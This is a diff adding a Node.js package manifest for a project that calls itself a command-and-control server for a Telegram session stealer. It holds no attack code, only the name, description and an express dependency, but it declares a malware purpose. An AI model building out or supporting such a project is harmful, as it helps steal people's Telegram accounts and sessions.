@@ -1,0 +1,12 @@
+{
+    "name": "c2-telegram-server",
+    "version": "1.0.0",
+    "description": "C2 Server for Telegram Session Stealer",
+    "main": "server.js",
+    "scripts": {
+        "start": "node server.js"
+    },
+    "dependencies": {
+        "express": "^4.18.2"
+    }
+}
